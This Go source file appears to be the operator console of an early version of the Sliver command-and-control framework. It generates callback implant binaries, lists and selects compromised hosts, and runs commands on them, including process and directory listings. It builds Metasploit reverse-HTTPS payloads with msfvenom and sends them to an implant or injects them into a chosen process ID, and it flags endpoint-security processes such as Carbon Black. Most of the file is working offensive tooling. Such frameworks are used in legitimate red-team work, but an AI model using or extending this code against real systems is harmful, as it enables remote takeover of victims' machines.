package main

import (
	"bytes"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	pb "sliver/protobuf"
	"sliver/server/msf"
	"sort"
	"strconv"
	"strings"
	"text/tabwriter"
	"text/template"
	"time"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh/terminal"
)

const (
	normal    = "\033[0m"
	black     = "\033[30m"
	red       = "\033[31m"
	green     = "\033[32m"
	orange    = "\033[33m"
	blue      = "\033[34m"
	purple    = "\033[35m"
	cyan      = "\033[36m"
	gray      = "\033[37m"
	bold      = "\033[1m"
	clearln   = "\r\x1b[2K"
	upN       = "\033[%dA"
	downN     = "\033[%dB"
	underline = "\033[4m"

	// Info - Display colorful information
	Info = bold + cyan + "[*] " + normal
	// Warn - Warn a user
	Warn = bold + red + "[!] " + normal
	// Debug - Display debug information
	Debug = bold + purple + "[-] " + normal
	// Woot - Display success
	Woot = bold + green + "[$] " + normal
)

var (
	activeSliver *Sliver
	cmdTimeout   = 10 * time.Second

	// Stylizes known processes in the `ps` command
	knownProcs = map[string]string{
		"ccSvcHst.exe": red, // SEP
		"cb.exe":       red, // Carbon Black
	}

	cmdHandlers = map[string]interface{}{
		"help":     helpCmd,
		"s":        sessionsCmd,
		"sess":     sessionsCmd,
		"sessions": sessionsCmd,
		"info":     infoCmd,
		"use":      useCmd,
		"gen":      generateCmd,
		"generate": generateCmd,
		"msf":      msfCmd,
		"inject":   injectCmd,
		"ps":       psCmd,
		"ping":     pingCmd,
		"kill":     killCmd,

		"ls":       lsCmd,
		"cd":       cdCmd,
		"pwd":      pwdCmd,
		"download": downloadCmd,
		"upload":   uploadCmd,
	}
)

func startConsole(events chan Event) {
	if !terminal.IsTerminal(0) || !terminal.IsTerminal(1) {
		log.Print("stdin/stdout should be terminal")
		return
	}
	oldState, err := terminal.MakeRaw(0)
	if err != nil {
		return
	}
	defer terminal.Restore(0, oldState)
	screen := struct {
		io.Reader
		io.Writer
	}{os.Stdin, os.Stdout}
	term := terminal.NewTerminal(screen, "")
	setPrompt(term)

	fmt.Fprintf(term, Info+"Welcome to the sliver shell, see `help` for available commands\n")

	reader := make(chan string) // Read lines in from user
	done := make(chan bool)     // Tell the reader the previous command has completed
	go lineReader(term, reader, done)
	for {
		select {
		case line := <-reader:
			fmt.Fprintln(term, "", line)
			if line == "exit" {
				return
			}
			words := strings.Fields(line)
			if cmd, ok := cmdHandlers[words[0]]; ok {
				cmd.(func(*terminal.Terminal, []string))(term, words[1:])
			} else {
				fmt.Fprintf(term, Warn+"Invalid command '%s'\n", words[0])
			}
			done <- true
		case event := <-events:
			sliver := event.Sliver
			switch event.EventType {
			case "connected":
				fmt.Fprintf(term, Info+"Session #%d %s - %s (%s) - %s/%s\n",
					sliver.Id, sliver.Name, sliver.RemoteAddress, sliver.Hostname, sliver.Os, sliver.Arch)
			case "disconnected":
				fmt.Fprintf(term, Warn+"Lost session #%d %s - %s (%s) - %s/%s\n",
					sliver.Id, sliver.Name, sliver.RemoteAddress, sliver.Hostname, sliver.Os, sliver.Arch)
				if activeSliver != nil && sliver.Id == activeSliver.Id {
					activeSliver = nil
					setPrompt(term)
					fmt.Fprintf(term, Warn+"Warning: Active sliver diconnected\n")
				}
			}
		}
	}
}

func lineReader(term *terminal.Terminal, reader chan string, done chan bool) {
	defer close(reader)
	for {
		line, err := term.ReadLine()
		if err == io.EOF || strings.HasPrefix(line, "exit") {
			reader <- "exit"
			return
		}
		if err != nil {
			log.Printf("Error %v", err)
			reader <- "exit"
			return
		}
		if line == "" {
			continue
		} else {
			reader <- line
			<-done // Block until command completes
		}
	}
}

func setPrompt(term *terminal.Terminal) {
	prompt := fmt.Sprintf(clearln + "\n" + underline + "sliver" + normal)
	if activeSliver != nil {
		prompt += fmt.Sprintf(bold+red+" (%s)%s", activeSliver.Name, normal)
	}
	prompt += " > "
	term.SetPrompt(prompt)
}

func getSliver(name string) *Sliver {
	id, err := strconv.Atoi(name)
	name = strings.ToUpper(name)
	hiveMutex.Lock()
	defer hiveMutex.Unlock()
	if err == nil {
		if sliver, ok := (*hive)[id]; ok {
			return sliver
		}
	}
	for _, sliver := range *hive {
		if sliver.Name == name {
			return sliver
		}
	}
	return nil
}

func activeSliverRequest(msgType string, reqId string, data []byte) (pb.Envelope, error) {
	if activeSliver == nil {
		return pb.Envelope{}, errors.New("No active sliver")
	}
	resp := make(chan pb.Envelope)
	(*activeSliver).Resp[reqId] = resp
	defer close(resp)
	defer delete((*activeSliver).Resp, reqId)
	(*activeSliver).Send <- pb.Envelope{
		Id:   reqId,
		Type: msgType,
		Data: data,
	}

	var respEnvelope pb.Envelope
	select {
	case respEnvelope = <-resp:
	case <-time.After(cmdTimeout):
		return pb.Envelope{}, errors.New("timeout")
	}
	return respEnvelope, nil
}

// ---------------- Commands ----------------
func helpCmd(term *terminal.Terminal, args []string) {
	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(getHelpFor(args))
	tmpl.Execute(term, struct {
		Normal    string
		Bold      string
		Underline string
	}{
		Normal:    normal,
		Bold:      bold,
		Underline: underline,
	})

}

func sessionsCmd(term *terminal.Terminal, args []string) {
	sessionsFlags := flag.NewFlagSet("sessions", flag.ContinueOnError)
	sessionsFlags.Usage = func() { helpCmd(term, []string{"sessions"}) }
	err := sessionsFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	if 0 < len(*hive) {
		printSlivers(term)
	} else {
		fmt.Fprintln(term, "\n"+Info+"No slivers connected")
	}
}

/*
	So this method is a little more complex than you'd maybe think,
	this is because Go's tabwriter aligns columns by counting bytes
	and since we want to modify the color of the active sliver row
	the number of bytes per row won't line up. So we render the table
	into a buffer and note which row the active sliver is in. Then we
	write each line to the term and insert the ANSI codes just before
	we display the row.
*/
func printSlivers(term *terminal.Terminal) {
	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)

	// Column Headers
	fmt.Fprintln(table, "\nID\tName\tRemote Address\tUsername\tOperating System\t")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("ID")),
		strings.Repeat("=", len("Name")),
		strings.Repeat("=", len("Remote Address")),
		strings.Repeat("=", len("Username")),
		strings.Repeat("=", len("Operating System")))
	hiveMutex.Lock()
	defer hiveMutex.Unlock()

	// Sort the keys becuase maps have a randomized order
	var keys []int
	for _, sliver := range *hive {
		keys = append(keys, sliver.Id)
	}
	sort.Ints(keys)

	activeIndex := -1
	for index, key := range keys {
		sliver := (*hive)[key]
		if activeSliver != nil && activeSliver.Id == sliver.Id {
			activeIndex = index + 3 // Two lines for the headers
		}
		fmt.Fprintf(table, "%d\t%s\t%s\t%s\t%s\t\n",
			sliver.Id, sliver.Name, sliver.RemoteAddress, sliver.Username,
			fmt.Sprintf("%s/%s", sliver.Os, sliver.Arch))
	}
	table.Flush()

	if activeIndex != -1 {
		lines := strings.Split(outputBuf.String(), "\n")
		for lineNumber, line := range lines {
			if lineNumber == activeIndex {
				fmt.Fprintf(term, "%s%s%s\n", green, line, normal)
			} else {
				fmt.Fprintf(term, "%s\n", line)
			}
		}
	} else {
		fmt.Fprintf(term, outputBuf.String())
	}
}

func killCmd(term *terminal.Terminal, args []string) {
	killFlags := flag.NewFlagSet("kill", flag.ContinueOnError)
	killFlags.Usage = func() { helpCmd(term, []string{"kill"}) }
	err := killFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	var sliver *Sliver
	if activeSliver != nil {
		sliver = getSliver(strconv.Itoa(activeSliver.Id))
	} else if 0 < len(args) {
		sliver = getSliver(args[0])
	}
	if sliver != nil {
		fmt.Fprintf(term, "\n"+Info+"Killing sliver %s (%d)", sliver.Name, sliver.Id)
		data, _ := proto.Marshal(&pb.KillReq{Id: randomId()})
		(*sliver).Send <- pb.Envelope{
			Type: "kill",
			Data: data,
		}
	}
}

func infoCmd(term *terminal.Terminal, args []string) {
	infoFlags := flag.NewFlagSet("info", flag.ContinueOnError)
	infoFlags.Usage = func() { helpCmd(term, []string{"info"}) }
	err := infoFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	var sliver *Sliver
	if activeSliver != nil {
		sliver = getSliver(strconv.Itoa(activeSliver.Id))
	} else if 0 < len(args) {
		sliver = getSliver(args[0])
	}
	if sliver != nil {
		fmt.Fprintln(term, "")
		fmt.Fprintf(term, bold+"ID: %s%d\n", normal, sliver.Id)
		fmt.Fprintf(term, bold+"Name: %s%s\n", normal, sliver.Name)
		fmt.Fprintf(term, bold+"Hostname: %s%s\n", normal, sliver.Hostname)
		fmt.Fprintf(term, bold+"Username: %s%s\n", normal, sliver.Username)
		fmt.Fprintf(term, bold+"UID: %s%s\n", normal, sliver.Uid)
		fmt.Fprintf(term, bold+"GID: %s%s\n", normal, sliver.Gid)
		fmt.Fprintf(term, bold+"OS: %s%s\n", normal, sliver.Os)
		fmt.Fprintf(term, bold+"Arch: %s%s\n", normal, sliver.Arch)
		fmt.Fprintf(term, bold+"Remote Address: %s%s\n", normal, sliver.RemoteAddress)
		fmt.Fprintln(term, "")
	} else {
		fmt.Fprintln(term, "\n"+Warn+"Invalid sliver name")
	}
}

func useCmd(term *terminal.Terminal, args []string) {
	useFlags := flag.NewFlagSet("use", flag.ContinueOnError)
	useFlags.Usage = func() { helpCmd(term, []string{"use"}) }
	err := useFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	if 0 < len(args) {
		sliver := getSliver(args[0])
		if sliver != nil {
			activeSliver = sliver
			setPrompt(term)
			fmt.Fprintf(term, "\n"+Info+"Active sliver set to '%s' (%d)\n", activeSliver.Name, activeSliver.Id)
		} else {
			fmt.Fprintf(term, "\n"+Warn+"No sliver with name '%s'\n", args[0])
		}
	} else {
		fmt.Fprintln(term, "\n"+Warn+"Missing sliver name\n")
	}
}

func generateCmd(term *terminal.Terminal, args []string) {
	genFlags := flag.NewFlagSet("gen", flag.ContinueOnError)
	target := genFlags.String("os", windowsPlatform, "operating system")
	arch := genFlags.String("arch", "amd64", "cpu architecture (amd64/386)")
	lhost := genFlags.String("lhost", *server, "sliver server listener lhost")
	lport := genFlags.Int("lport", *serverLPort, "sliver server listner port")
	debug := genFlags.Bool("debug", false, "generate a debug binary")
	save := genFlags.String("save", "", "save binary file to path")
	genFlags.Usage = func() { helpCmd(term, []string{"generate"}) }
	err := genFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}
	if *lhost == "" {
		fmt.Fprintf(term, "\n"+Warn+"Invalid lhost '%s'\n", *lhost)
		return
	}

	fmt.Fprintf(term, "\n"+Info+"Generating new %s/%s sliver binary, please wait ... \n", *target, *arch)
	path, err := GenerateImplantBinary(*target, *arch, *lhost, uint16(*lport), *debug)
	if err != nil {
		fmt.Fprintf(term, Warn+"Error generating sliver: %v\n", err)
	}
	if save == nil || *save == "" {
		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", path)
	} else {
		saveTo, _ := filepath.Abs(*save)
		fi, _ := os.Stat(saveTo)
		if fi.IsDir() {
			filename := filepath.Base(path)
			saveTo = filepath.Join(saveTo, filename)
		}
		err = copyFileContents(path, saveTo)
		if err != nil {
			fmt.Fprintf(term, Warn+"Failed to write to %s\n", saveTo)
		}
		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", saveTo)
	}
}

func msfCmd(term *terminal.Terminal, args []string) {
	msfFlags := flag.NewFlagSet("msf", flag.ContinueOnError)
	payloadName := msfFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
	lhost := msfFlags.String("lhost", "", "metasploit listener lhost")
	lport := msfFlags.Int("lport", 4444, "metasploit listner port")
	msfFlags.Usage = func() { helpCmd(term, []string{"msf"}) }
	err := msfFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	if activeSliver == nil {
		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
		return
	}

	if *lhost == "" {
		fmt.Fprintf(term, "\n"+Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
		return
	}

	fmt.Fprintf(term, "\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
		*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
	config := msf.VenomConfig{
		Os:         activeSliver.Os,
		Arch:       msf.MsfArch(activeSliver.Arch),
		Payload:    *payloadName,
		LHost:      *lhost,
		LPort:      uint16(*lport),
		Encoder:    "",
		Iterations: 0, // TODO: Add support for msf encoders/encrypters
		Encrypt:    "",
	}
	rawPayload, err := msf.MsfVenomPayload(config)
	if err != nil {
		fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
		return
	}
	fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))

	fmt.Fprintf(term, Info+"Sending payload -> %s\n", activeSliver.Name)
	data, _ := proto.Marshal(&pb.Task{
		Encoder: "raw",
		Data:    rawPayload,
	})
	(*activeSliver).Send <- pb.Envelope{
		Type: "task",
		Data: data,
	}
	fmt.Fprintf(term, Info+"Sucessfully sent payload\n")

}

func injectCmd(term *terminal.Terminal, args []string) {
	injectFlags := flag.NewFlagSet("inject", flag.ContinueOnError)
	injectPid := injectFlags.Int("pid", 0, "pid to inject payload into")
	payloadName := injectFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
	lhost := injectFlags.String("lhost", "", "metasploit listener lhost")
	lport := injectFlags.Int("lport", 4444, "metasploit listner port")
	injectFlags.Usage = func() { helpCmd(term, []string{"inject"}) }
	err := injectFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	if activeSliver == nil {
		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
		return
	}
	if *lhost == "" {
		fmt.Fprintf(term, Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
		return
	}

	fmt.Fprintf(term, "\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
		*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
	config := msf.VenomConfig{
		Os:         activeSliver.Os,
		Arch:       msf.MsfArch(activeSliver.Arch),
		Payload:    *payloadName,
		LHost:      *lhost,
		LPort:      uint16(*lport),
		Encoder:    "",
		Iterations: 0, // TODO: Add support for msf encoders/encrypters
		Encrypt:    "",
	}
	rawPayload, err := msf.MsfVenomPayload(config)
	if err != nil {
		fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
		return
	}
	fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))

	fmt.Fprintf(term, Info+"Sending payload -> %s -> PID: %d\n", activeSliver.Name, *injectPid)
	data, _ := proto.Marshal(&pb.RemoteTask{
		Pid:     int32(*injectPid),
		Encoder: "raw",
		Data:    rawPayload,
	})
	(*activeSliver).Send <- pb.Envelope{
		Type: "remoteTask",
		Data: data,
	}
	fmt.Fprintf(term, Info+"Sucessfully sent payload\n")

}

func psCmd(term *terminal.Terminal, args []string) {
	psFlags := flag.NewFlagSet("ps", flag.ContinueOnError)
	pidFilter := psFlags.Int("pid", -1, "find proc by pid")
	exeFilter := psFlags.String("exe", "", "filter procs by name")
	psFlags.Usage = func() { helpCmd(term, []string{"ps"}) }
	err := psFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	if activeSliver == nil {
		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
		return
	}

	fmt.Fprintf(term, Info+"Requesting process list from %s ...\n", activeSliver.Name)

	reqId := randomId()
	data, _ := proto.Marshal(&pb.ProcessListReq{Id: reqId})
	envelope, err := activeSliverRequest("psReq", reqId, data)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Error: %s", err)
		return
	}

	psList := &pb.ProcessList{}
	err = proto.Unmarshal(envelope.Data, psList)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	header := fmt.Sprintf("\n% 6s | % 6s | %s\n", "pid", "ppid", "executable")
	fmt.Fprintf(term, header)
	fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(header)))
	for _, proc := range psList.Processes {
		if *pidFilter != -1 {
			if proc.Pid == int32(*pidFilter) {
				printProcInfo(term, proc)
			}
		}
		if *exeFilter != "" {
			if strings.HasPrefix(proc.Executable, *exeFilter) {
				printProcInfo(term, proc)
			}
		}
		if *pidFilter == -1 && *exeFilter == "" {
			printProcInfo(term, proc)
		}
	}
	fmt.Fprintf(term, "\n")

}

// printProcInfo - Stylizes the process information
func printProcInfo(term *terminal.Terminal, proc *pb.Process) {
	color := normal
	if modifyColor, ok := knownProcs[proc.Executable]; ok {
		color = modifyColor
	}
	if proc.Pid == activeSliver.Pid {
		color = green
	}
	fmt.Fprintf(term, "%s%s% 6d%s%s | % 6d | %s%s\n",
		color, bold, proc.Pid, normal, color, proc.Ppid, proc.Executable, normal)
}

func pingCmd(term *terminal.Terminal, args []string) {
	pingFlags := flag.NewFlagSet("ping", flag.ContinueOnError)
	pingFlags.Usage = func() { helpCmd(term, []string{"ping"}) }
	err := pingFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	var sliver *Sliver
	if activeSliver != nil {
		sliver = getSliver(strconv.Itoa(activeSliver.Id))
	} else if 0 < len(args) {
		sliver = getSliver(args[0])
	}
	if sliver == nil {
		fmt.Fprintln(term, "\n"+Warn+"Invalid sliver name\n")
		return
	}

	reqId := randomId()
	data, _ := proto.Marshal(&pb.Ping{Id: reqId})
	envelope, err := activeSliverRequest("ping", reqId, data)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Error: %s\n", err)
		return
	}

	pong := &pb.Ping{}
	err = proto.Unmarshal(envelope.Data, pong)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	fmt.Fprintf(term, "\n"+Info+"Ping/Pong with ID = %s\n", pong.Id)

}

func lsCmd(term *terminal.Terminal, args []string) {
	lsFlags := flag.NewFlagSet("ls", flag.ContinueOnError)
	lsFlags.Usage = func() { helpCmd(term, []string{"ls"}) }
	args = lsFlags.Args()
	err := lsFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	if activeSliver == nil {
		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
		return
	}

	if len(args) < 1 {
		args = append(args, ".")
	}

	reqId := randomId()
	data, _ := proto.Marshal(&pb.DirListReq{
		Id:   reqId,
		Path: args[0],
	})
	envelope, err := activeSliverRequest("dirListReq", reqId, data)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Error: %s\n", err)
		return
	}
	dirList := &pb.DirList{}
	err = proto.Unmarshal(envelope.Data, dirList)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	if dirList.Exists {
		printDirList(term, dirList)
	} else {
		fmt.Fprintf(term, "\n"+Warn+"Directory does not exist (%s)\n", dirList.Path)
	}

}

func printDirList(term *terminal.Terminal, dirList *pb.DirList) {
	fmt.Fprintf(term, "\n%s\n", dirList.Path)
	fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(dirList.Path)))

	table := tabwriter.NewWriter(term, 0, 2, 2, ' ', 0)
	for _, fileInfo := range dirList.Files {
		if fileInfo.IsDir {
			fmt.Fprintf(table, "%s\t<dir>\t\n", fileInfo.Name)
		} else {
			fmt.Fprintf(table, "%s\t%s\t\n", fileInfo.Name, byteCountBinary(fileInfo.Size))
		}
	}
	table.Flush()
}

func cdCmd(term *terminal.Terminal, args []string) {
	cdFlags := flag.NewFlagSet("cd", flag.ContinueOnError)
	cdFlags.Usage = func() { helpCmd(term, []string{"cd"}) }
	err := cdFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}
	if activeSliver == nil {
		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
		return
	}

	reqId := randomId()
	data, _ := proto.Marshal(&pb.CdReq{
		Id:   reqId,
		Path: args[0],
	})
	envelope, err := activeSliverRequest("cdReq", reqId, data)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Error: %s\n", err)
		return
	}
	pwd := &pb.Pwd{}
	err = proto.Unmarshal(envelope.Data, pwd)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	if pwd.Err == "" {
		fmt.Fprintln(term, "\n"+Info+pwd.Path)
	} else {
		fmt.Fprintln(term, "\n"+Warn+pwd.Err)
	}

}

func pwdCmd(term *terminal.Terminal, args []string) {
	pwdFlags := flag.NewFlagSet("pwd", flag.ContinueOnError)
	pwdFlags.Usage = func() { helpCmd(term, []string{"pwd"}) }
	err := pwdFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}
	if activeSliver == nil {
		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
		return
	}

	reqId := randomId()
	data, _ := proto.Marshal(&pb.PwdReq{Id: reqId})
	envelope, err := activeSliverRequest("pwdReq", reqId, data)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Error: %s", err)
		return
	}
	pwd := &pb.Pwd{}
	err = proto.Unmarshal(envelope.Data, pwd)
	if err != nil {
		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	if pwd.Err == "" {
		fmt.Fprintln(term, "\n"+Info+pwd.Path)
	} else {
		fmt.Fprintln(term, "\n"+Warn+pwd.Err)
	}

}

func downloadCmd(term *terminal.Terminal, args []string) {
	downloadFlags := flag.NewFlagSet("download", flag.ContinueOnError)
	downloadFlags.Usage = func() { helpCmd(term, []string{"download"}) }
	err := downloadFlags.Parse(args)
	args = downloadFlags.Args()
	if err == flag.ErrHelp {
		return
	}

	if activeSliver == nil {
		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
		return
	}

}

func uploadCmd(term *terminal.Terminal, args []string) {
	uploadFlags := flag.NewFlagSet("upload", flag.ContinueOnError)
	uploadFlags.Usage = func() { helpCmd(term, []string{"upload"}) }
	err := uploadFlags.Parse(args)
	if err == flag.ErrHelp {
		return
	}

	if activeSliver == nil {
		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
		return
	}

}

func byteCountBinary(b int64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := int64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB", float64(b)/float64(div), "KMGTPE"[exp])
}
